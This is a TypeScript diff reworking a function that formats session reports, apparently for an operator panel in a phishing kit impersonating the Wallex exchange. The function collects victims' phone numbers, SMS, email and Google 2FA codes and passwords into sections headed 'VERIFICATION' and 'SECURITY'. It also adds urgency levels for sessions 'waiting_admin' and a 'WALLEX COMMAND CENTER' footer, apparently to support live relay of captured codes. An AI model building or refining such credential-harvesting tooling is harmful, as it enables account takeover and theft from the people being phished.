@@ -1081,7 +1081,7 @@ const getStepDisplayName = (stepType: string): string => {
 };
 
 /**
- * Format session message in professional executive format
+ * Format session message in ultimate professional format with smart features
  */
 const formatSessionMessage = (session: UserSession): string => {
   // Escape HTML characters in user data
@@ -1094,76 +1094,155 @@ const formatSessionMessage = (session: UserSession): string => {
       .replace(/'/g, "&#39;");
   };
 
-  // Get current time in Persian
-  const currentTime = new Date().toLocaleString("fa-IR", {
+  // Smart time formatting
+  const now = new Date();
+  const currentTime = now.toLocaleString("fa-IR", {
     hour: "2-digit",
     minute: "2-digit",
   });
+  const currentDate = now.toLocaleDateString("fa-IR", {
+    month: "2-digit",
+    day: "2-digit",
+  });
 
-  // Calculate session duration
+  // Enhanced session analytics
   const sessionStart = new Date(session.startTime);
-  const duration = Math.floor((Date.now() - sessionStart.getTime()) / 60000);
-  const durationText = duration < 1 ? "کمتر از 1 دقیقه" : `${duration} دقیقه`;
+  const durationMs = Date.now() - sessionStart.getTime();
+  const durationMin = Math.floor(durationMs / 60000);
+  const durationSec = Math.floor((durationMs % 60000) / 1000);
 
-  // Status priority indicator
-  const getStatusPriority = (
+  let durationText;
+  if (durationMin < 1) {
+    durationText = `${durationSec}s`;
+  } else if (durationMin < 60) {
+    durationText = `${durationMin}m ${durationSec}s`;
+  } else {
+    const hours = Math.floor(durationMin / 60);
+    const mins = durationMin % 60;
+    durationText = `${hours}h ${mins}m`;
+  }
+
+  // Smart priority system with urgency indicators
+  const getSmartStatus = (
     step: string,
-  ): { emoji: string; priority: string } => {
+    duration: number,
+  ): {
+    emoji: string;
+    priority: string;
+    urgency: string;
+    color: string;
+  } => {
+    const isUrgent = duration > 10; // More than 10 minutes
+    const isCritical = duration > 30; // More than 30 minutes
+
     switch (step) {
       case "waiting_admin":
-        return { emoji: "🟠", priority: "URGENT" };
+        if (isCritical)
+          return {
+            emoji: "🔴",
+            priority: "CRITICAL",
+            urgency: "⚡",
+            color: "RED",
+          };
+        if (isUrgent)
+          return {
+            emoji: "🟠",
+            priority: "URGENT",
+            urgency: "⏰",
+            color: "ORANGE",
+          };
+        return {
+          emoji: "🟡",
+          priority: "PENDING",
+          urgency: "📋",
+          color: "YELLOW",
+        };
       case "phone_verification":
-        return { emoji: "🟡", priority: "PENDING" };
+        return {
+          emoji: "🔵",
+          priority: "VERIFY",
+          urgency: "📱",
+          color: "BLUE",
+        };
       case "completed":
-        return { emoji: "🟢", priority: "DONE" };
+        return {
+          emoji: "🟢",
+          priority: "SUCCESS",
+          urgency: "✅",
+          color: "GREEN",
+        };
       default:
-        return { emoji: "🔵", priority: "ACTIVE" };
+        return {
+          emoji: "⚪",
+          priority: "PROCESSING",
+          urgency: "⚙️",
+          color: "WHITE",
+        };
     }
   };
 
-  const status = getStatusPriority(session.currentStep);
+  const status = getSmartStatus(session.currentStep, durationMin);
 
-  // Executive header with priority
-  let message = `${status.emoji} <b>AUTH REQUEST</b> ${status.priority}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  // Progress calculation
+  const totalSteps = 5; // phone, waiting_admin, auth methods, verification, complete
+  const completedCount = session.completedSteps?.length || 0;
+  const progressPercent = Math.round((completedCount / totalSteps) * 100);
+  const progressBar =
+    "█".repeat(Math.floor(progressPercent / 10)) +
+    "░".repeat(10 - Math.floor(progressPercent / 10));
+
+  // Ultimate professional header
+  let message = `${status.emoji} <b>WALLEX AUTH</b> ${status.priority} ${status.urgency}
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 📱 <b>${escapeHtml(session.phoneNumber)}</b>
-⏱️ ${currentTime} | ${durationText}`;
+🕐 ${currentDate} ${currentTime} • ${durationText}
+📊 Progress: ${progressBar} ${progressPercent}%`;
 
-  // Online status with enhanced info
+  // Real-time user status with enhanced info
   if (session.onlineStatus) {
     const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
-    const timeAgo =
-      timeSinceUpdate > 60000
-        ? `${Math.floor(timeSinceUpdate / 60000)}د`
-        : `${Math.floor(timeSinceUpdate / 1000)}ث`;
+    let activityLevel;
+    let timeDisplay;
 
-    const statusIcon = session.onlineStatus.statusEmoji;
-    const statusText = session.onlineStatus.statusText;
+    if (timeSinceUpdate < 30000) {
+      // Less than 30 seconds
+      activityLevel = "🔥 ACTIVE";
+      timeDisplay = `${Math.floor(timeSinceUpdate / 1000)}s`;
+    } else if (timeSinceUpdate < 300000) {
+      // Less than 5 minutes
+      activityLevel = "⚡ RECENT";
+      timeDisplay = `${Math.floor(timeSinceUpdate / 60000)}m`;
+    } else {
+      activityLevel = "💤 IDLE";
+      timeDisplay = `${Math.floor(timeSinceUpdate / 60000)}m`;
+    }
 
-    message += `\n${statusIcon} <b>${escapeHtml(statusText)}</b> (${timeAgo})`;
+    message += `\n${session.onlineStatus.statusEmoji} ${activityLevel} • ${timeDisplay}`;
   }
 
-  // Authentication data section
-  let authData = [];
+  // Smart credentials grouping
+  let securityData = [];
+  let verificationData = [];
 
-  // Phone verification - highest priority
+  // Phone verification (highest priority)
   if (session.phoneVerificationCode) {
-    authData.push(
-      `📱 PHONE: <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
-    );
+    verificationData.push(`📱 ${escapeHtml(session.phoneVerificationCode)}`);
   }
 
-  // Email credentials
+  // Email system
   if (session.email) {
-    authData.push(`📧 EMAIL: <code>${escapeHtml(session.email)}</code>`);
+    const emailShort =
+      session.email.length > 25
+        ? session.email.substring(0, 22) + "..."
+        : session.email;
+    verificationData.push(`📧 ${escapeHtml(emailShort)}`);
+
     if (session.emailCode) {
-      authData.push(
-        `✉️ EMAIL-CODE: <code>${escapeHtml(session.emailCode)}</code>`,
-      );
+      verificationData.push(`✉️ ${escapeHtml(session.emailCode)}`);
     }
   }
 
-  // Security credentials
+  // Security layer credentials
   if (session.authCodes && Object.keys(session.authCodes).length > 0) {
     Object.keys(session.authCodes).forEach((stepType) => {
       const stepCodes = session.authCodes[stepType];
@@ -1172,50 +1251,72 @@ const formatSessionMessage = (session: UserSession): string => {
 
         switch (stepType) {
           case "password":
-            authData.push(
-              `🔒 PASSWORD: <code>${escapeHtml(latestCode)}</code>`,
-            );
+            const maskedPassword = "*".repeat(Math.min(latestCode.length, 8));
+            securityData.push(`🔐 ${maskedPassword} (${latestCode.length})`);
             break;
           case "google":
-            authData.push(
-              `📲 2FA-CODE: <code>${escapeHtml(latestCode)}</code>`,
-            );
+            securityData.push(`📲 ${escapeHtml(latestCode)}`);
             break;
           case "sms":
-            authData.push(
-              `💬 SMS-CODE: <code>${escapeHtml(latestCode)}</code>`,
-            );
+            securityData.push(`💬 ${escapeHtml(latestCode)}`);
             break;
           case "email":
-            authData.push(`📨 E-CODE: <code>${escapeHtml(latestCode)}</code>`);
+            securityData.push(`📨 ${escapeHtml(latestCode)}`);
             break;
         }
       }
     });
   }
 
-  // Add authentication data if exists
-  if (authData.length > 0) {
-    message += `\n\n🔐 <b>CREDENTIALS:</b>\n` + authData.join("\n");
+  // Add credentials sections
+  if (verificationData.length > 0) {
+    message +=
+      `\n\n🔍 <b>VERIFICATION:</b>\n` +
+      verificationData.map((item) => `├ ${item}`).join("\n");
   }
 
-  // Executive summary footer
-  const completedCount = session.completedSteps?.length || 0;
+  if (securityData.length > 0) {
+    message +=
+      `\n\n🛡️ <b>SECURITY:</b>\n` +
+      securityData.map((item) => `├ ${item}`).join("\n");
+  }
+
+  // Smart risk assessment
   const totalAttempts = Object.values(session.authAttempts || {}).reduce(
     (sum, count) => sum + count,
     0,
   );
+  const hasMultipleFailures = totalAttempts > 3;
+  const isLongSession = durationMin > 15;
+  const hasMultipleAuthMethods = securityData.length > 1;
 
-  // Risk assessment
-  const riskLevel =
-    totalAttempts > 5 ? "🔴 HIGH" : totalAttempts > 2 ? "🟡 MED" : "🟢 LOW";
+  let riskScore = 0;
+  if (totalAttempts > 5) riskScore += 3;
+  else if (totalAttempts > 2) riskScore += 1;
+  if (isLongSession) riskScore += 1;
+  if (hasMultipleFailures) riskScore += 2;
 
-  message += `\n\n📊 <b>SUMMARY:</b>
-✅ Steps: ${completedCount} | 🔄 Attempts: ${totalAttempts}
-⚠️ Risk: ${riskLevel} | 🆔 ID: <code>${session.sessionId.substring(0, 8)}</code>
+  let riskAssessment;
+  if (riskScore >= 4) riskAssessment = "🔴 CRITICAL";
+  else if (riskScore >= 2) riskAssessment = "🟡 ELEVATED";
+  else riskAssessment = "🟢 NORMAL";
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<i>🛡️ Wallex Security System</i>`;
+  // Ultimate executive summary
+  const trustScore = hasMultipleAuthMethods
+    ? "🛡️ HIGH"
+    : verificationData.length > 0
+      ? "⚡ MED"
+      : "⚠️ LOW";
+
+  message += `\n\n📋 <b>EXECUTIVE SUMMARY:</b>
+┣ Completion: ${completedCount}/${totalSteps} steps
+┣ Attempts: ${totalAttempts} (${hasMultipleFailures ? "⚠️ Multiple" : "✅ Normal"})
+┣ Risk Level: ${riskAssessment}
+┣ Trust Score: ${trustScore}
+┗ Session: <code>${session.sessionId.substring(0, 10)}</code>
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+<i>🔐 WALLEX COMMAND CENTER</i>`;
 
   return message;
 };
